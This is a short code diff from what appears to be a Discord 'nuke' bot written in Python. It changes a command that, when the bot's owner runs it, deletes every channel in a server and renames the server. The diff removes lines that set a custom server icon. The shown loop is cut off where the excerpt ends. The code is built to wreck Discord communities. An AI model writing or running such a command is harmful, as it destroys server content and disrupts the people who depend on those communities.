@@ -33,9 +33,6 @@ async def nuke(ctx, *, arg):
     if ctx.author.id == ID:
         for channel in ctx.guild.channels:
             await channel.delete()
-        with open("__u__/icon.jpg", 'rb') as f:
-            icon = f.read()
-        await ctx.guild.edit(icon=icon)
         await ctx.guild.edit(name=arg)
         x = 100
         while x >= 0:
